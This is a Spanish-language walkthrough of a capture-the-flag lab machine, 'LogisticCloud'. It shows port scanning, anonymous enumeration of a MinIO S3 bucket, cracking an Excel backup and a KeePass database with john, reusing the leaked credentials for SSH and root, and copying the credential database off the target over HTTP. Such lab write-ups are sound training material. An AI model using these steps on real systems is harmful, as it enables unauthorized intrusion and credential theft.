---
icon: flag
---

# CTF LogisticCloud Intermediate

URL Download CTF = [https://drive.google.com/file/d/1Q\_MfbyRTFYyEt6lg1ADB-UpefgA76qic/view?usp=sharing](https://drive.google.com/file/d/1Q_MfbyRTFYyEt6lg1ADB-UpefgA76qic/view?usp=sharing)

### Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip logisticcloud.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_mount.sh logisticcloud.tar
```

Info:

```
___________________¶¶
____________________¶¶__¶_5¶¶
____________5¶5__¶5__¶¶_5¶__¶¶¶5
__________5¶¶¶__¶¶5¶¶¶¶¶5¶¶__5¶¶¶5
_________¶¶¶¶__¶5¶¶¶¶¶¶¶¶¶¶¶__5¶¶¶¶5
_______5¶¶¶¶__¶¶¶¶¶¶¶¶¶¶¶_5¶¶__5¶¶¶¶¶5
______¶¶¶¶¶5_¶¶¶¶¶¶¶¶¶¶¶¶¶5¶¶¶__¶¶¶¶5¶5
_____¶¶¶¶¶¶_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_¶¶¶¶¶¶¶5
____¶¶¶¶¶¶¶_¶¶¶5¶¶¶¶5_¶¶¶¶¶5_5¶_¶¶¶¶¶¶¶¶5
___¶¶¶¶¶¶¶¶__5¶¶¶¶¶¶5___5¶¶¶¶__5¶¶¶¶¶¶¶¶¶5
__¶¶¶¶¶¶¶¶¶¶5__5¶¶¶¶¶¶5__5¶¶5_5¶¶¶¶¶¶¶¶¶¶¶
_5¶¶¶¶¶¶¶¶¶¶¶¶_5¶¶¶¶¶¶¶¶¶5__5¶¶¶¶¶¶¶¶¶¶¶¶¶5
_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_5¶¶¶¶
5¶¶¶¶¶¶¶¶¶¶¶¶5___5¶¶¶¶¶¶¶5__¶¶¶¶5_¶¶¶5_¶¶¶¶
¶¶¶¶¶¶¶¶_¶¶5_5¶5__¶¶¶¶¶¶¶¶¶5_5¶¶¶_5¶¶¶_5¶¶¶5
¶5¶¶¶¶¶5_¶¶_5¶¶¶¶¶_¶¶¶¶¶¶¶¶¶¶5_5¶¶_5¶¶¶_¶¶¶5
¶¶¶¶_¶¶__¶__¶¶¶¶¶¶5_5¶¶¶¶¶¶¶¶¶¶5_¶¶_5¶¶_5¶¶¶
¶¶¶5_5¶______5¶¶5¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶5_¶¶_5¶5_¶5¶
5¶¶____5¶¶¶¶5_____5¶¶¶¶¶¶¶5_¶¶¶¶¶5_¶__¶¶_5¶¶
_¶¶__5¶¶¶¶¶¶¶¶¶¶5____5¶¶¶¶¶¶_¶¶¶¶¶_____¶5_¶¶
_¶¶___5¶¶¶¶¶¶¶¶¶__________5¶5_¶¶¶¶¶____¶¶_¶¶
_¶¶_______5¶¶¶¶¶¶5____________¶¶¶¶¶_____¶_¶¶
_5¶5________5¶¶_¶¶¶¶5________5¶¶¶¶¶_______¶¶
__¶¶__________¶___¶¶¶¶¶5___5¶¶¶¶¶¶5_______¶5
__¶¶____________5¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶________¶
___¶________________5¶¶¶¶¶¶¶¶5_¶¶
___¶__________5¶¶¶¶¶¶¶¶5¶¶¶5__5¶5
_____________________5¶¶¶5____¶5

                                           
 ##   ##    ##       ####   ###  ##  #######  ######   ####       ##     ######    #####  
 ##   ##   ####     ##  ##   ##  ##   ##   #   ##  ##   ##       ####     ##  ##  ##   ## 
 ##   ##  ##  ##   ##        ## ##    ## #     ##  ##   ##      ##  ##    ##  ##  #       
 #######  ##  ##   ##        ####     ####     #####    ##      ##  ##    #####    #####  
 ##   ##  ######   ##        ## ##    ## #     ## ##    ##   #  ######    ##  ##       ## 
 ##   ##  ##  ##    ##  ##   ##  ##   ##   #   ##  ##   ##  ##  ##  ##    ##  ##  ##   ## 
 ##   ##  ##  ##     ####   ###  ##  #######  #### ##  #######  ##  ##   ######    #####  
                                         

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-09 05:04 EDT
Nmap scan report for bicho.dl (172.17.0.2)
Host is up (0.00016s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e9:59:86:db:ea:af:ff:09:ee:8f:ab:c6:0d:b8:b5:82 (ECDSA)
|_  256 ff:8d:9f:f8:e7:a5:f4:ce:6a:2d:e4:30:ac:77:18:fc (ED25519)
80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Login - HLG Logistics
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.58 (Ubuntu)
9000/tcp open  http    Golang net/http server
|_http-title: Did not follow redirect to http://bicho.dl:9001
|_http-server-header: MinIO
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Accept-Ranges: bytes
|     Content-Length: 303
|     Content-Type: application/xml
|     Server: MinIO
|     Strict-Transport-Security: max-age=31536000; includeSubDomains
|     Vary: Origin
|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
|     X-Amz-Request-Id: 183DD07DC90B2EC0
|     X-Content-Type-Options: nosniff
|     X-Xss-Protection: 1; mode=block
|     Date: Fri, 09 May 2025 09:04:29 GMT
|     <?xml version="1.0" encoding="UTF-8"?>
|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid argument)</Message><Resource>/nice 
ports,/Trinity.txt.bak</Resource><RequestId>183DD07DC90B2EC0</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Er
ror>
|   GenericLines, Help, RTSPRequest, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 400 Bad Request
|     Accept-Ranges: bytes
|     Content-Length: 276
|     Content-Type: application/xml
|     Server: MinIO
|     Strict-Transport-Security: max-age=31536000; includeSubDomains
|     Vary: Origin
|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
|     X-Amz-Request-Id: 183DD07A46C8B7BE
|     X-Content-Type-Options: nosniff
|     X-Xss-Protection: 1; mode=block
|     Date: Fri, 09 May 2025 09:04:14 GMT
|     <?xml version="1.0" encoding="UTF-8"?>
|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid 
argument)</Message><Resource>/</Resource><RequestId>183DD07A46C8B7BE</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</Hos
tId></Error>
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Vary: Origin
|     Date: Fri, 09 May 2025 09:04:14 GMT
|_    Content-Length: 0
9001/tcp open  http    Golang net/http server
|_http-title: MinIO Console
|_http-server-header: MinIO Console
| fingerprint-strings: 
|   GenericLines, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Content-Length: 1309
|     Content-Security-Policy: default-src 'self' 'unsafe-eval' 'unsafe-inline'; script-src 'self' https://unpkg.com; connect-src 'self' https://unpkg.com;
|     Content-Type: text/html
|     Last-Modified: Fri, 09 May 2025 09:04:14 GMT
|     Referrer-Policy: strict-origin-when-cross-origin
|     Server: MinIO Console
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: DENY
|     X-Xss-Protection: 1; mode=block
|     Date: Fri, 09 May 2025 09:04:14 GMT
|_    <!doctype html><html lang="en"><head><meta charset="utf-8"/><base href="/"/><meta content="width=device-width,initial-scale=1" name="viewport"/><meta 
content="#081C42" media="(prefers-color-scheme: light)" name="theme-color"/><meta content="#081C42" media="(prefers-color-scheme: dark)" 
name="theme-color"/><meta content="MinIO Console" name="description"/><meta name="minio-license" content="agpl"/><link href="./s
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at 
https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9000-TCP:V=7.95%I=7%D=5/9%Time=681DC50E%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
SF:0Request")%r(GetRequest,2B0,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nAcce
SF:pt-Ranges:\x20bytes\r\nContent-Length:\x20276\r\nContent-Type:\x20appli
SF:cation/xml\r\nServer:\x20MinIO\r\nStrict-Transport-Security:\x20max-age
SF:=31536000;\x20includeSubDomains\r\nVary:\x20Origin\r\nX-Amz-Id-2:\x20dd
SF:9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8\r\nX-Amz
SF:-Request-Id:\x20183DD07A46C8B7BE\r\nX-Content-Type-Options:\x20nosniff\
SF:r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20Fri,\x2009\x20May\
SF:x202025\x2009:04:14\x20GMT\r\n\r\n<\?xml\x20version=\"1\.0\"\x20encodin
SF:g=\"UTF-8\"\?>\n<Error><Code>InvalidRequest</Code><Message>Invalid\x20R
SF:equest\x20\(invalid\x20argument\)</Message><Resource>/</Resource><Reque
SF:stId>183DD07A46C8B7BE</RequestId><HostId>dd9025bab4ad464b049177c95eb6eb
SF:f374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>")%r(HTTPOptions,59,
SF:"HTTP/1\.0\x20200\x20OK\r\nVary:\x20Origin\r\nDate:\x20Fri,\x2009\x20Ma
SF:y\x202025\x2009:04:14\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRe
SF:quest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/p
SF:lain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Req
SF:uest")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
SF:d\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r
SF:\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close
SF:\r\n\r\n400\x20Bad\x20Request")%r(FourOhFourRequest,2CB,"HTTP/1\.0\x204
SF:00\x20Bad\x20Request\r\nAccept-Ranges:\x20bytes\r\nContent-Length:\x203
SF:03\r\nContent-Type:\x20application/xml\r\nServer:\x20MinIO\r\nStrict-Tr
SF:ansport-Security:\x20max-age=31536000;\x20includeSubDomains\r\nVary:\x2
SF:0Origin\r\nX-Amz-Id-2:\x20dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af92
SF:51148b658df7ac2e3e8\r\nX-Amz-Request-Id:\x20183DD07DC90B2EC0\r\nX-Conte
SF:nt-Type-Options:\x20nosniff\r\nX-Xss-Protection:\x201;\x20mode=block\r\
SF:nDate:\x20Fri,\x2009\x20May\x202025\x2009:04:29\x20GMT\r\n\r\n<\?xml\x2
SF:0version=\"1\.0\"\x20encoding=\"UTF-8\"\?>\n<Error><Code>InvalidRequest
SF:</Code><Message>Invalid\x20Request\x20\(invalid\x20argument\)</Message>
SF:<Resource>/nice\x20ports,/Trinity\.txt\.bak</Resource><RequestId>183DD0
SF:7DC90B2EC0</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1
SF:af9251148b658df7ac2e3e8</HostId></Error>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9001-TCP:V=7.95%I=7%D=5/9%Time=681DC50E%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
SF:0Request")%r(GetRequest,702,"HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:\x
SF:20bytes\r\nContent-Length:\x201309\r\nContent-Security-Policy:\x20defau
SF:lt-src\x20'self'\x20'unsafe-eval'\x20'unsafe-inline';\x20script-src\x20
SF:'self'\x20https://unpkg\.com;\x20\x20connect-src\x20'self'\x20https://u
SF:npkg\.com;\r\nContent-Type:\x20text/html\r\nLast-Modified:\x20Fri,\x200
SF:9\x20May\x202025\x2009:04:14\x20GMT\r\nReferrer-Policy:\x20strict-origi
SF:n-when-cross-origin\r\nServer:\x20MinIO\x20Console\r\nX-Content-Type-Op
SF:tions:\x20nosniff\r\nX-Frame-Options:\x20DENY\r\nX-Xss-Protection:\x201
SF:;\x20mode=block\r\nDate:\x20Fri,\x2009\x20May\x202025\x2009:04:14\x20GM
SF:T\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><meta\x20charset=
SF:\"utf-8\"/><base\x20href=\"/\"/><meta\x20content=\"width=device-width,i
SF:nitial-scale=1\"\x20name=\"viewport\"/><meta\x20content=\"#081C42\"\x20
SF:media=\"\(prefers-color-scheme:\x20light\)\"\x20name=\"theme-color\"/><
SF:meta\x20content=\"#081C42\"\x20media=\"\(prefers-color-scheme:\x20dark\
SF:)\"\x20name=\"theme-color\"/><meta\x20content=\"MinIO\x20Console\"\x20n
SF:ame=\"description\"/><meta\x20name=\"minio-license\"\x20content=\"agpl\
SF:"/><link\x20href=\"\./s")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x
SF:20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnectio
SF:n:\x20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,702,"HTTP/1\.0
SF:\x20200\x20OK\r\nAccept-Ranges:\x20bytes\r\nContent-Length:\x201309\r\n
SF:Content-Security-Policy:\x20default-src\x20'self'\x20'unsafe-eval'\x20'
SF:unsafe-inline';\x20script-src\x20'self'\x20https://unpkg\.com;\x20\x20c
SF:onnect-src\x20'self'\x20https://unpkg\.com;\r\nContent-Type:\x20text/ht
SF:ml\r\nLast-Modified:\x20Fri,\x2009\x20May\x202025\x2009:04:14\x20GMT\r\
SF:nReferrer-Policy:\x20strict-origin-when-cross-origin\r\nServer:\x20MinI
SF:O\x20Console\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-Options:\
SF:x20DENY\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20Fri,\x2009
SF:\x20May\x202025\x2009:04:14\x20GMT\r\n\r\n<!doctype\x20html><html\x20la
SF:ng=\"en\"><head><meta\x20charset=\"utf-8\"/><base\x20href=\"/\"/><meta\
SF:x20content=\"width=device-width,initial-scale=1\"\x20name=\"viewport\"/
SF:><meta\x20content=\"#081C42\"\x20media=\"\(prefers-color-scheme:\x20lig
SF:ht\)\"\x20name=\"theme-color\"/><meta\x20content=\"#081C42\"\x20media=\
SF:"\(prefers-color-scheme:\x20dark\)\"\x20name=\"theme-color\"/><meta\x20
SF:content=\"MinIO\x20Console\"\x20name=\"description\"/><meta\x20name=\"m
SF:inio-license\"\x20content=\"agpl\"/><link\x20href=\"\./s");
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.05 seconds
```

Vemos muchas cosas interesantes, entre ellas el puerto `80` que aloja una pagina web, si nos metemos dentro veremos un `login` como de una empresa de `logistica`.

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Si probamos credenciales por defecto no funcionaran, tampoco si probamos a realizar un `SQLi`, pero si inspeccionamos el codigo veremos lo siguiente:

```html
<input hidden="huguelogistics-data" name="bucket">
```

Veremos esta parte del codigo en el formulario, por lo que vemos esta hablando de `bucket` y despues en el `hidden` vemos el siguiente nombre:

```
huguelogistics-data
```

Podemos creer que es un servidor en una `nube` y ese es el `endpoint` de dicho servidor, basicamente el nombre del `bucket`.

Vamos a probar a intentar enumerar las `politicas` del `bucket` con dicho nombre a ver si se pudiera enumerar de forma anonima.

## AWS

```shell
aws --no-sign-request --endpoint-url http://<IP>:9000 s3api get-bucket-policy --bucket huguelogistics-data
```

Info:

```
{
    "Policy": "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Sid\":\"AllowPublicReadPolicy\",\"Effect\":\"Allow\",\"Principal\":{\"AWS\":[\"*\"]},\"Action\":[\"s3:GetBucketPolicy\",\"s3:GetObject\",\"s3:ListBucket\"],\"Resource\":[\"arn:aws:s3:::huguelogistics-data\",\"arn:aws:s3:::huguelogistics-data/*\"]}]}"
}
```

Vemos que si nos deja, pero vamos a enumerarlo de forma mas clara y que se vea mejor.

```shell
aws --no-sign-request --endpoint-url http://<IP>:9000 s3api get-bucket-policy --bucket huguelogistics-data | jq -r '.Policy | fromjson | .Statement[] | {Effect, Principal, Action, Resource, Sid}'
```

Info:

```js
{
  "Effect": "Allow",
  "Principal": {
    "AWS": [
      "*"
    ]
  },
  "Action": [
    "s3:ListBucket",
    "s3:GetBucketPolicy",
    "s3:GetObject"
  ],
  "Resource": [
    "arn:aws:s3:::huguelogistics-data",
    "arn:aws:s3:::huguelogistics-data/*"
  ],
  "Sid": "AllowPublicReadPolicy"
}
```

Vemos que efectivamente todos los usuarios de la `nube` pueden enumerar las politicas del `bucket`, tambien veremos que podemos descargarnos cualquier cosa que este subida al `bucket` con el `*`, por lo que vamos a realizar lo siguiente:

Vamos a intentar enumerar los archivos o directorios que pueda tener la web.

### Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/index.php            (Status: 200) [Size: 1953]
/admin.php            (Status: 200) [Size: 1953]
/javascript           (Status: 403) [Size: 275]
/logout.php           (Status: 200) [Size: 1953]
/vendor               (Status: 200) [Size: 3104]
/note.txt             (Status: 200) [Size: 13]
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos que hay un archivo llamado `note.txt` que si entramos dentro veremos lo siguiente:

```
/backup.xlsx
```

Por lo que vamos a intentar descargarnos el archivo en tal caso de que este subido en el `bucket`.

```shell
aws --no-sign-request --endpoint-url http://<IP>:9000 s3 cp s3://huguelogistics-data/backup.xlsx .
```

Info:

```
download: s3://huguelogistics-data/backup.xlsx to ./backup.xlsx
```

Veremos que ha funcionado, por lo que vamos a intentar leer el archivo `.xlsx`, pero antes para leerlo instalaremos las herramientas necesarias en `kali`.

```shell
sudo apt update
sudo apt install --reinstall libreoffice
```

Una vez echo esto, si intentamos abrir el archivo veremos lo siguiente:

```shell
libreoffice backup.xlsx
```

Info:

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Veremos que tiene contraseña, por lo que vamos a intentar `crackerla` con `john`.

### Crackeo XLSX

```shell
office2john backup.xlsx > hash.xlsx
```

Ahora con dicho `hash` probaremos a `crackeralo` para extraer la contraseña.

```shell
john --wordlist=<WORDLIST> hash.xlsx
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 128/128 AVX 4x / SHA512 128/128 AVX 2x AES])
Cost 1 (MS Office version) is 2007 for all loaded hashes
Cost 2 (iteration count) is 50000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password88       (backup.xlsx)     
1g 0:00:00:05 DONE (2025-05-09 05:25) 0.1814g/s 3095p/s 3095c/s 3095C/s princez..mia305
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Veremos que hemos sacado la `password` de dicho archivo, por lo que vamos a probarlo.

```shell
libreoffice backup.xlsx
```

Metemos como contraseña `password88` y veremos que ahora si nos deja entrar:

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Vemos que es una `DDBB` de usuarios, contraseñas, etc... De una empresa de logistica, por lo que vamos a probar alguna de ellas para probarlas en el `login`.

```
User: prudencia.de.ferrera
Pass: )4UJM)JGab
```

Veremos que si nos ha dejado entrar con dicho usuario:

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

Si abrimos el menu de `haburguesa` veremos con este usuario la opcion `Bandeja de entrada`, pero si entramos con otro usuario no lo veremos, por lo que tendremos que entrar con este usuario y si entramos en dicha opcion, veremos lo siguiente:

```

Bandeja de entrada
Mensaje del Administrador

Usuario: prudencia.de.ferrera

Credenciales SSH:

            Usuario: prudencia-de-ferrera
            Contraseña: PuT3r3stA#SH
            Host: 192.168.1.100
            Puerto: 22
            

Por favor, conéctate al servidor y revisa el estado del sistema de logística para resolver cualquier incidencia.
```

Vemos que nos estan proporcionando unas credenciales para conectarnos por `SSH` para arreglar alguna cosa del servidor, por lo que vamos a probar a conectarnos.

### SSH

```shell
ssh prudencia-de-ferrera@<IP>
```

Metemos como contraseña `PuT3r3stA#SH` y veremos que estaremos dentro por lo que leeremos la `flag` del usuario.

> user.txt

```
a303ce44f50628e5511aca3538d11f3e
```

## Escalate Privileges

Vamos a filtrar a ver que archivos se han creado como el usuario `root` de las ultimas fechas en la ruta `/etc`.

```shell
find /etc -type f -user root -exec stat --format '%Y :%y %n' {} + 2>/dev/null | sort -nr | head
```

Info:

```
1746781317 :2025-05-09 11:01:57.620468091 +0200 /etc/hosts
1746781316 :2025-05-09 11:01:56.807770047 +0200 /etc/hostname
1746781316 :2025-05-09 11:01:56.803787399 +0200 /etc/resolv.conf
1746718769 :2025-05-08 17:39:29.000000000 +0200 /etc/keepass/credentialsDatabase.kdb
1746718711 :2025-05-08 17:38:31.000000000 +0200 /etc/shadow
1746715965 :2025-05-08 16:52:45.000000000 +0200 /etc/subuid
1746715965 :2025-05-08 16:52:45.000000000 +0200 /etc/subgid
1746715965 :2025-05-08 16:52:45.000000000 +0200 /etc/passwd
1746715965 :2025-05-08 16:52:45.000000000 +0200 /etc/gshadow
1746715965 :2025-05-08 16:52:45.000000000 +0200 /etc/group
```

Vemos un archivo bastante interesante que es el siguiente:

```
/etc/keepass/credentialsDatabase.kdb
```

Vemos que es un archivo de credenciales en `keepass`, vamos a pasarnoslo a nuestra maquina `host` para intentar `crackear` la contraseña `maestra` de dicho archivo.

```shell
python3 -m http.server
```

Ahora desde la maquina `host` vamos a descargar dicho archivo.

```shell
wget http://<IP>:8000/credentialsDatabase.kdb
```

Ahora vamos a intentar `crackearlo`.

### Crackeo de KeePass

```shell
keepass2john credentialsDatabase.kdb > hash.keepass
```

```shell
john --wordlist=<WORDLIST> hash.keepass
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 600000 for all loaded hashes
Cost 2 (version) is 1 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
EMINEM           (credentialsDatabase.kdb)     
1g 0:00:02:46 DONE (2025-05-09 05:45) 0.006006g/s 47.66p/s 47.66c/s 47.66C/s jeannette..melania
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Veremos que hemos conseguido la `clave maestra` de dicho archivo, por lo que vamos a meterlo para ver que contiene.

Desde un `Windows` instalaremos `KeePass` pero el `XC` no serviria, tiene que ser el normal, una vez instalado e importado la `DDBB` meteremos como clave maestra `EMINEM` y se nos desbloqueara de forma correcta.

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

Veremos credenciales, pero los usuarios no coinciden con ninguno del sistema, por lo que vamos a probar a meter la primera contraseña del primer usuario por si fuera la misma que la de `root`.

```shell
su root
```

Metemos como contraseña `RMeEdDPKbgFWmPnQHVC8` y veremos que estaremos dentro como dicho usuario, por lo que leeremos la `flag` de `root`.

> root.txt

```
16ceffb6b5f596855037e8ab1718b75f
```
